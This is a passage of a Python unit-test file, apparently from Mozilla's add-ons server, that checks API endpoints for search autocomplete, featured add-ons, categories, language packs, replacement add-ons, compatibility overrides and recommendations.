        addon_factory(slug='my-addon', name=u'My Addôn',
                      weekly_downloads=666)
        addon_factory(slug='my-persona', name=u'My Persona',
                      type=amo.ADDON_PERSONA)
        self.refresh()

        view = AddonAutoCompleteSearchView()
        view.request = APIRequestFactory().get('/')
        qset = view.get_queryset()

        includes = set((
            'default_locale', 'icon_type', 'id', 'modified',
            'name_translations', 'persona', 'slug', 'type'))

        assert set(qset.to_dict()['_source']['includes']) == includes

        response = qset.execute()

        # Sort by type to avoid sorting problems before picking the
        # first result. (We have a theme and an add-on)
        hit = sorted(response.hits.hits, key=lambda x: x['_source']['type'])
        assert set(hit[1]['_source'].keys()) == includes

    def test_no_unlisted(self):
        addon_factory(slug='my-addon', name=u'My Addôn',
                      status=amo.STATUS_NULL,
                      weekly_downloads=666,
                      version_kw={'channel': amo.RELEASE_CHANNEL_UNLISTED})
        self.refresh()
        data = self.perform_search(self.url)
        assert 'count' not in data
        assert len(data['results']) == 0

    def test_pagination(self):
        [addon_factory() for x in range(0, 11)]
        self.refresh()

        # page_size should be ignored, we should get 10 results.
        data = self.perform_search(self.url, {'page_size': 1})
        assert 'count' not in data
        assert 'next' not in data
        assert 'prev' not in data
        assert len(data['results']) == 10


class TestAddonFeaturedView(TestCase):
    client_class = APITestClient

    def setUp(self):
        self.url = reverse('v3:addon-featured')

    def test_no_parameters(self):
        response = self.client.get(self.url)
        assert response.status_code == 400
        assert json.loads(response.content) == {
            'detail': 'Invalid app, category and/or type parameter(s).'}

    @patch('olympia.addons.views.get_featured_ids')
    def test_app_only(self, get_featured_ids_mock):
        addon1 = addon_factory()
        addon2 = addon_factory()
        get_featured_ids_mock.return_value = [addon1.pk, addon2.pk]

        response = self.client.get(self.url, {'app': 'firefox'})
        assert get_featured_ids_mock.call_count == 1
        assert (get_featured_ids_mock.call_args_list[0][0][0] ==
                amo.FIREFOX)  # app
        assert (get_featured_ids_mock.call_args_list[0][1] ==
                {'types': None, 'lang': None})
        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['results']
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == addon1.pk
        assert data['results'][1]['id'] == addon2.pk

    @patch('olympia.addons.views.get_featured_ids')
    def test_app_and_type(self, get_featured_ids_mock):
        addon1 = addon_factory()
        addon2 = addon_factory()
        get_featured_ids_mock.return_value = [addon1.pk, addon2.pk]

        response = self.client.get(self.url, {
            'app': 'firefox', 'type': 'extension'
        })
        assert get_featured_ids_mock.call_count == 1
        assert (get_featured_ids_mock.call_args_list[0][0][0] ==
                amo.FIREFOX)  # app
        assert (get_featured_ids_mock.call_args_list[0][1] ==
                {'types': [amo.ADDON_EXTENSION], 'lang': None})
        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['results']
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == addon1.pk
        assert data['results'][1]['id'] == addon2.pk

    @patch('olympia.addons.views.get_featured_ids')
    def test_app_and_types(self, get_featured_ids_mock):
        addon1 = addon_factory()
        addon2 = addon_factory()
        get_featured_ids_mock.return_value = [addon1.pk, addon2.pk]

        response = self.client.get(self.url, {
            'app': 'firefox', 'type': 'extension,theme'
        })
        assert get_featured_ids_mock.call_count == 1
        assert (get_featured_ids_mock.call_args_list[0][0][0] ==
                amo.FIREFOX)  # app
        assert (get_featured_ids_mock.call_args_list[0][1] ==
                {'types': [amo.ADDON_EXTENSION, amo.ADDON_THEME],
                 'lang': None})
        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['results']
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == addon1.pk
        assert data['results'][1]['id'] == addon2.pk

    @patch('olympia.addons.views.get_featured_ids')
    def test_app_and_type_and_lang(self, get_featured_ids_mock):
        addon1 = addon_factory()
        addon2 = addon_factory()
        get_featured_ids_mock.return_value = [addon1.pk, addon2.pk]

        response = self.client.get(self.url, {
            'app': 'firefox', 'type': 'extension', 'lang': 'es'
        })
        assert get_featured_ids_mock.call_count == 1
        assert (get_featured_ids_mock.call_args_list[0][0][0] ==
                amo.FIREFOX)  # app
        assert (get_featured_ids_mock.call_args_list[0][1] ==
                {'types': [amo.ADDON_EXTENSION], 'lang': 'es'})
        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['results']
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == addon1.pk
        assert data['results'][1]['id'] == addon2.pk

    def test_invalid_app(self):
        response = self.client.get(
            self.url, {'app': 'foxeh', 'type': 'extension'})
        assert response.status_code == 400
        assert json.loads(response.content) == {
            'detail': 'Invalid app, category and/or type parameter(s).'}

    def test_invalid_type(self):
        response = self.client.get(self.url, {'app': 'firefox', 'type': 'lol'})
        assert response.status_code == 400
        assert json.loads(response.content) == {
            'detail': 'Invalid app, category and/or type parameter(s).'}

    def test_category_no_app_or_type(self):
        response = self.client.get(self.url, {'category': 'lol'})
        assert response.status_code == 400
        assert json.loads(response.content) == {
            'detail': 'Invalid app, category and/or type parameter(s).'}

    def test_invalid_category(self):
        response = self.client.get(self.url, {
            'category': 'lol', 'app': 'firefox', 'type': 'extension'
        })
        assert response.status_code == 400
        assert json.loads(response.content) == {
            'detail': 'Invalid app, category and/or type parameter(s).'}

    @patch('olympia.addons.views.get_creatured_ids')
    def test_category(self, get_creatured_ids_mock):
        addon1 = addon_factory()
        addon2 = addon_factory()
        get_creatured_ids_mock.return_value = [addon1.pk, addon2.pk]

        response = self.client.get(self.url, {
            'category': 'alerts-updates', 'app': 'firefox', 'type': 'extension'
        })
        assert get_creatured_ids_mock.call_count == 1
        assert get_creatured_ids_mock.call_args_list[0][0][0] == 72  # category
        assert get_creatured_ids_mock.call_args_list[0][0][1] is None  # lang
        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['results']
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == addon1.pk
        assert data['results'][1]['id'] == addon2.pk

    @patch('olympia.addons.views.get_creatured_ids')
    def test_category_with_multiple_types(self, get_creatured_ids_mock):
        addon1 = addon_factory()
        addon2 = addon_factory()
        get_creatured_ids_mock.return_value = [addon1.pk, addon2.pk]

        response = self.client.get(self.url, {
            'category': 'nature', 'app': 'firefox',
            'type': 'persona,statictheme'
        })
        assert get_creatured_ids_mock.call_count == 2
        assert get_creatured_ids_mock.call_args_list[0][0][0] == 102  # cat
        assert get_creatured_ids_mock.call_args_list[0][0][1] is None  # lang
        assert get_creatured_ids_mock.call_args_list[1][0][0] == 302  # cat
        assert get_creatured_ids_mock.call_args_list[1][0][1] is None  # lang
        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['results']
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == addon1.pk
        assert data['results'][1]['id'] == addon2.pk

    @patch('olympia.addons.views.get_creatured_ids')
    def test_category_with_lang(self, get_creatured_ids_mock):
        addon1 = addon_factory()
        addon2 = addon_factory()
        get_creatured_ids_mock.return_value = [addon1.pk, addon2.pk]

        response = self.client.get(self.url, {
            'category': 'alerts-updates', 'app': 'firefox',
            'type': 'extension', 'lang': 'fr',
        })
        assert get_creatured_ids_mock.call_count == 1
        assert get_creatured_ids_mock.call_args_list[0][0][0] == 72  # cat id.
        assert get_creatured_ids_mock.call_args_list[0][0][1] == 'fr'  # lang
        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['results']
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == addon1.pk
        assert data['results'][1]['id'] == addon2.pk


class TestStaticCategoryView(TestCase):
    client_class = APITestClient

    def setUp(self):
        super(TestStaticCategoryView, self).setUp()
        self.url = reverse('v3:category-list')

    def test_basic(self):
        with self.assertNumQueries(0):
            response = self.client.get(self.url)
        assert response.status_code == 200
        data = json.loads(response.content)

        assert len(data) == 113

        # some basic checks to verify integrity
        entry = data[0]

        assert entry == {
            u'name': u'Feeds, News & Blogging',
            u'weight': 0,
            u'misc': False,
            u'id': 1,
            u'application': u'firefox',
            u'description': None,
            u'type': u'extension',
            u'slug': u'feeds-news-blogging'
        }

    def test_with_description(self):
        # StaticCategory is immutable, so avoid calling it's __setattr__
        # directly.
        object.__setattr__(CATEGORIES_BY_ID[1], 'description', u'does stuff')
        with self.assertNumQueries(0):
            response = self.client.get(self.url)
        assert response.status_code == 200
        data = json.loads(response.content)

        assert len(data) == 113

        # some basic checks to verify integrity
        entry = data[0]

        assert entry == {
            u'name': u'Feeds, News & Blogging',
            u'weight': 0,
            u'misc': False,
            u'id': 1,
            u'application': u'firefox',
            u'description': u'does stuff',
            u'type': u'extension',
            u'slug': u'feeds-news-blogging'
        }

    @pytest.mark.needs_locales_compilation
    def test_name_translated(self):
        with self.assertNumQueries(0):
            response = self.client.get(self.url, HTTP_ACCEPT_LANGUAGE='de')

        assert response.status_code == 200
        data = json.loads(response.content)

        assert data[0]['name'] == 'RSS-Feeds, Nachrichten & Bloggen'

    def test_cache_control(self):
        response = self.client.get(self.url)
        assert response.status_code == 200
        assert response['cache-control'] == 'max-age=21600'


class TestLanguageToolsView(TestCase):
    client_class = APITestClient

    def setUp(self):
        super(TestLanguageToolsView, self).setUp()
        self.url = reverse('v3:addon-language-tools')

    def test_wrong_app_or_no_app(self):
        response = self.client.get(self.url)
        assert response.status_code == 400
        assert response.data == {
            'detail': u'Invalid or missing app parameter.'}

        response = self.client.get(self.url, {'app': 'foo'})
        assert response.status_code == 400
        assert response.data == {
            'detail': u'Invalid or missing app parameter.'}

    def test_basic(self):
        dictionary = addon_factory(type=amo.ADDON_DICT, target_locale='fr')
        dictionary_spelling_variant = addon_factory(
            type=amo.ADDON_DICT, target_locale='fr',
            locale_disambiguation='For spelling reform')
        language_pack = addon_factory(
            type=amo.ADDON_LPAPP, target_locale='es',
            file_kw={'strict_compatibility': True},
            version_kw={'min_app_version': '57.0', 'max_app_version': '57.*'})

        # These add-ons below should be ignored: they are either not public or
        # of the wrong type, not supporting the app we care about, or their
        # target locale is empty.
        addon_factory(
            type=amo.ADDON_LPAPP, target_locale='de',
            version_kw={'application': amo.THUNDERBIRD.id})
        addon_factory(
            type=amo.ADDON_DICT, target_locale='fr',
            version_kw={'channel': amo.RELEASE_CHANNEL_UNLISTED})
        addon_factory(
            type=amo.ADDON_LPAPP, target_locale='es',
            file_kw={'status': amo.STATUS_AWAITING_REVIEW},
            status=amo.STATUS_NOMINATED)
        addon_factory(type=amo.ADDON_DICT, target_locale='')
        addon_factory(type=amo.ADDON_LPAPP, target_locale=None)
        addon_factory(target_locale='fr')

        response = self.client.get(self.url, {'app': 'firefox'})
        assert response.status_code == 200
        data = json.loads(response.content)
        assert len(data['results']) == 3
        expected = [dictionary, dictionary_spelling_variant, language_pack]

        assert (
            set(item['id'] for item in data['results']) ==
            set(item.pk for item in expected))

        assert 'locale_disambiguation' in data['results'][0]
        assert 'target_locale' in data['results'][0]
        # We were not filtering by appversion, so we do not get the
        # current_compatible_version property.
        assert 'current_compatible_version' not in data['results'][0]

    def test_with_appversion_but_no_type(self):
        response = self.client.get(
            self.url, {'app': 'firefox', 'appversion': '57.0'})
        assert response.status_code == 400
        assert response.data == {
            'detail': 'Invalid or missing type parameter while appversion '
                      'parameter is set.'}

    def test_with_invalid_appversion(self):
        response = self.client.get(
            self.url,
            {'app': 'firefox', 'type': 'language', 'appversion': u'foôbar'})
        assert response.status_code == 400
        assert response.data == {'detail': 'Invalid appversion parameter.'}

    def test_with_appversion_filtering(self):
        # Add compatible add-ons. We're going to request language packs
        # compatible with 58.0.
        compatible_pack1 = addon_factory(
            name='Spanish Language Pack',
            type=amo.ADDON_LPAPP, target_locale='es',
            file_kw={'strict_compatibility': True},
            version_kw={'min_app_version': '57.0', 'max_app_version': '57.*'})
        compatible_pack1.current_version.update(created=self.days_ago(2))
        compatible_version1 = version_factory(
            addon=compatible_pack1, file_kw={'strict_compatibility': True},
            min_app_version='58.0', max_app_version='58.*')
        compatible_version1.update(created=self.days_ago(1))
        compatible_pack2 = addon_factory(
            name='French Language Pack',
            type=amo.ADDON_LPAPP, target_locale='fr',
            file_kw={'strict_compatibility': True},
            version_kw={'min_app_version': '58.0', 'max_app_version': '58.*'})
        compatible_version2 = compatible_pack2.current_version
        compatible_version2.update(created=self.days_ago(1))
        version_factory(
            addon=compatible_pack2, file_kw={'strict_compatibility': True},
            min_app_version='59.0', max_app_version='59.*')
        # Add a more recent version for both add-ons, that would be compatible
        # with 58.0, but is not public/listed so should not be returned.
        version_factory(
            addon=compatible_pack1, file_kw={'strict_compatibility': True},
            min_app_version='58.0', max_app_version='58.*',
            channel=amo.RELEASE_CHANNEL_UNLISTED)
        version_factory(
            addon=compatible_pack2,
            file_kw={'strict_compatibility': True,
                     'status': amo.STATUS_DISABLED},
            min_app_version='58.0', max_app_version='58.*')

        # Add a few of incompatible add-ons.
        incompatible_pack1 = addon_factory(
            name='German Language Pack (incompatible with 58.0)',
            type=amo.ADDON_LPAPP, target_locale='fr',
            file_kw={'strict_compatibility': True},
            version_kw={'min_app_version': '56.0', 'max_app_version': '56.*'})
        version_factory(
            addon=incompatible_pack1, file_kw={'strict_compatibility': True},
            min_app_version='59.0', max_app_version='59.*')
        addon_factory(
            name='Italian Language Pack (incompatible with 58.0)',
            type=amo.ADDON_LPAPP, target_locale='it',
            file_kw={'strict_compatibility': True},
            version_kw={'min_app_version': '59.0', 'max_app_version': '59.*'})
        addon_factory(
            name='Thunderbird Polish Language Pack',
            type=amo.ADDON_LPAPP, target_locale='pl',
            file_kw={'strict_compatibility': True},
            version_kw={
                'application': amo.THUNDERBIRD.id,
                'min_app_version': '58.0', 'max_app_version': '58.*'})
        # Even add a pack with a compatible version... not public. And another
        # one with a compatible version... not listed.
        incompatible_pack2 = addon_factory(
            name='Japanese Language Pack (public, but 58.0 version is not)',
            type=amo.ADDON_LPAPP, target_locale='ja',
            file_kw={'strict_compatibility': True},
            version_kw={'min_app_version': '57.0', 'max_app_version': '57.*'})
        version_factory(
            addon=incompatible_pack2,
            min_app_version='58.0', max_app_version='58.*',
            file_kw={'status': amo.STATUS_AWAITING_REVIEW,
                     'strict_compatibility': True})
        incompatible_pack3 = addon_factory(
            name='Nederlands Language Pack (58.0 version is unlisted)',
            type=amo.ADDON_LPAPP, target_locale='ja',
            file_kw={'strict_compatibility': True},
            version_kw={'min_app_version': '57.0', 'max_app_version': '57.*'})
        version_factory(
            addon=incompatible_pack3,
            min_app_version='58.0', max_app_version='58.*',
            channel=amo.RELEASE_CHANNEL_UNLISTED,
            file_kw={'strict_compatibility': True})

        # Test it.
        with self.assertNumQueries(5):
            # 5 queries, regardless of how many add-ons are returned:
            # - 1 for the add-ons
            # - 1 for the add-ons translations (name)
            # - 1 for the compatible versions (through prefetch_related)
            # - 1 for the applications versions for those versions
            #     (we don't need it, but we're using the default Version
            #      transformer to get the files... this could be improved.)
            # - 1 for the files for those versions
            response = self.client.get(
                self.url,
                {'app': 'firefox', 'appversion': '58.0', 'type': 'language',
                 'lang': 'en-US'})
        assert response.status_code == 200, response.content
        results = response.data['results']
        assert len(results) == 2

        # Ordering is not guaranteed by this API, but do check that the
        # current_compatible_version returned makes sense.
        assert results[0]['current_compatible_version']
        assert results[1]['current_compatible_version']

        expected_versions = set((
            (compatible_pack1.pk, compatible_version1.pk),
            (compatible_pack2.pk, compatible_version2.pk),
        ))
        returned_versions = set((
            (results[0]['id'], results[0]['current_compatible_version']['id']),
            (results[1]['id'], results[1]['current_compatible_version']['id']),
        ))
        assert expected_versions == returned_versions

    def test_memoize(self):
        addon_factory(type=amo.ADDON_DICT, target_locale='fr')
        addon_factory(
            type=amo.ADDON_DICT, target_locale='fr',
            locale_disambiguation='For spelling reform')
        addon_factory(type=amo.ADDON_LPAPP, target_locale='es')
        addon_factory(
            type=amo.ADDON_LPAPP, target_locale='de',
            version_kw={'application': amo.THUNDERBIRD.id})

        with self.assertNumQueries(2):
            response = self.client.get(
                self.url, {'app': 'firefox', 'lang': 'fr'})
        assert response.status_code == 200
        assert len(json.loads(response.content)['results']) == 3

        # Same again, should be cached; no queries.
        with self.assertNumQueries(0):
            assert self.client.get(
                self.url, {'app': 'firefox', 'lang': 'fr'}).content == (
                    response.content
            )

        with self.assertNumQueries(2):
            assert (
                self.client.get(
                    self.url, {'app': 'thunderbird', 'lang': 'fr'}).content !=
                response.content
            )
        # Same again, should be cached; no queries.
        with self.assertNumQueries(0):
            self.client.get(self.url, {'app': 'thunderbird', 'lang': 'fr'})
        # Change the lang, we should get queries again.
        with self.assertNumQueries(2):
            self.client.get(self.url, {'app': 'firefox', 'lang': 'de'})


class TestReplacementAddonView(TestCase):
    client_class = APITestClient

    def test_basic(self):
        # Add a single addon replacement
        rep_addon1 = addon_factory()
        ReplacementAddon.objects.create(
            guid='legacy2addon@moz',
            path=urlunquote(rep_addon1.get_url_path()))
        # Add a collection replacement
        author = user_factory()
        collection = collection_factory(author=author)
        rep_addon2 = addon_factory()
        rep_addon3 = addon_factory()
        collection.set_addons([rep_addon2.id, rep_addon3.id])
        ReplacementAddon.objects.create(
            guid='legacy2collection@moz',
            path=urlunquote(collection.get_url_path()))
        # Add an invalid path
        ReplacementAddon.objects.create(
            guid='notgonnawork@moz',
            path='/addon/áddonmissing/')

        response = self.client.get(reverse('v3:addon-replacement-addon'))
        assert response.status_code == 200
        data = json.loads(response.content)
        results = data['results']
        assert len(results) == 3
        assert ({'guid': 'legacy2addon@moz',
                 'replacement': [rep_addon1.guid]} in results)
        assert ({'guid': 'legacy2collection@moz',
                 'replacement': [rep_addon2.guid, rep_addon3.guid]} in results)
        assert ({'guid': 'notgonnawork@moz',
                 'replacement': []} in results)


class TestCompatOverrideView(TestCase):
    client_class = APITestClient

    def setUp(self):
        self.addon = addon_factory(guid='extrabad@thing')
        self.override_addon = CompatOverride.objects.create(
            name='override with addon', guid=self.addon.guid, addon=self.addon)
        CompatOverrideRange.objects.create(
            compat=self.override_addon, app=amo.FIREFOX.id)
        self.override_without = CompatOverride.objects.create(
            name='override no addon', guid='bad@thing')
        CompatOverrideRange.objects.create(
            compat=self.override_without, app=amo.FIREFOX.id)

    def test_single_guid(self):
        response = self.client.get(
            reverse('v3:addon-compat-override'),
            data={'guid': u'extrabad@thing'})
        assert response.status_code == 200
        data = json.loads(response.content)
        assert len(data['results']) == 1
        result = data['results'][0]
        assert result['addon_guid'] == 'extrabad@thing'
        assert result['addon_id'] == self.addon.id
        assert result['name'] == 'override with addon'

    def test_multiple_guid(self):
        response = self.client.get(
            reverse('v3:addon-compat-override'),
            data={'guid': u'extrabad@thing,bad@thing'})
        assert response.status_code == 200
        data = json.loads(response.content)
        results = data['results']
        assert len(results) == 2

        assert results[0]['addon_guid'] == 'bad@thing'
        assert results[0]['addon_id'] is None
        assert results[0]['name'] == 'override no addon'
        assert results[1]['addon_guid'] == 'extrabad@thing'
        assert results[1]['addon_id'] == self.addon.id
        assert results[1]['name'] == 'override with addon'

        # Throw in some random invalid guids too that will be ignored.
        response = self.client.get(
            reverse('v3:addon-compat-override'),
            data={'guid': (
                u'extrabad@thing,invalid@guid,notevenaguid$,bad@thing')})
        assert response.status_code == 200
        data = json.loads(response.content)
        results = data['results']
        assert len(results) == 2
        assert results[0]['addon_guid'] == 'bad@thing'
        assert results[1]['addon_guid'] == 'extrabad@thing'

    def test_no_guid_param(self):
        response = self.client.get(
            reverse('v3:addon-compat-override'),
            data={'guid': u'invalid@thing'})
        # Searching for non-matching guids, it should be an empty 200 response.
        assert response.status_code == 200
        assert len(json.loads(response.content)['results']) == 0

        response = self.client.get(
            reverse('v3:addon-compat-override'), data={'guid': ''})
        # Empty query is a 400 because a guid is required for overrides.
        assert response.status_code == 400
        assert 'Empty, or no, guid parameter provided.' in response.content

        response = self.client.get(
            reverse('v3:addon-compat-override'))
        # And no guid param should be a 400 too
        assert response.status_code == 400
        assert 'Empty, or no, guid parameter provided.' in response.content


class TestAddonRecommendationView(ESTestCase):
    client_class = APITestClient

    fixtures = ['base/users']

    def setUp(self):
        super(TestAddonRecommendationView, self).setUp()
        self.url = reverse('v3:addon-recommendations')
        patcher = mock.patch(
            'olympia.addons.views.get_addon_recommendations')
        self.get_recommendations_mock = patcher.start()
        self.addCleanup(patcher.stop)

    def tearDown(self):
        super(TestAddonRecommendationView, self).tearDown()
        self.empty_index('default')
        self.refresh()

    def perform_search(self, url, data=None, expected_status=200, **headers):
        with self.assertNumQueries(0):
            response = self.client.get(url, data, **headers)
        assert response.status_code == expected_status, response.content
        data = json.loads(response.content)
        return data

    def test_basic(self):
        addon1 = addon_factory(id=101, guid='101@mozilla')
        addon2 = addon_factory(id=102, guid='102@mozilla')
        addon3 = addon_factory(id=103, guid='103@mozilla')
        addon4 = addon_factory(id=104, guid='104@mozilla')
        self.get_recommendations_mock.return_value = (
            ['101@mozilla', '102@mozilla', '103@mozilla', '104@mozilla'],
            'success', 'no_reason')
        self.refresh()

        data = self.perform_search(
            self.url, {'guid': 'foo@baa', 'recommended': 'False'})
        self.get_recommendations_mock.assert_called_with('foo@baa', False)
        assert data['outcome'] == 'success'
        assert data['fallback_reason'] == 'no_reason'
        assert data['count'] == 4
        assert len(data['results']) == 4

        result = data['results'][0]
        assert result['id'] == addon1.pk
        assert result['guid'] == '101@mozilla'
        result = data['results'][1]
        assert result['id'] == addon2.pk
        assert result['guid'] == '102@mozilla'
        result = data['results'][2]
        assert result['id'] == addon3.pk
        assert result['guid'] == '103@mozilla'
        result = data['results'][3]
        assert result['id'] == addon4.pk
        assert result['guid'] == '104@mozilla'

    def test_es_queries_made_no_results(self):
        self.get_recommendations_mock.return_value = (
            ['@a', '@b'], 'foo', 'baa')
        with patch.object(
                Elasticsearch, 'search',
                wraps=amo.search.get_es().search) as search_mock:
            data = self.perform_search(self.url, data={'q': 'foo'})
            assert data['count'] == 0
            assert len(data['results']) == 0
            assert search_mock.call_count == 1

    def test_es_queries_made_some_result(self):
        addon_factory(slug='foormidable', name=u'foo', guid='@a')
        addon_factory(slug='foobar', name=u'foo', guid='@b')
        self.refresh()

        self.get_recommendations_mock.return_value = (
            ['@a', '@b'], 'foo', 'baa')
        with patch.object(
                Elasticsearch, 'search',
                wraps=amo.search.get_es().search) as search_mock:
            data = self.perform_search(
                self.url, data={'q': 'foo'})
            assert data['count'] == 2
            assert len(data['results']) == 2
            assert search_mock.call_count == 1
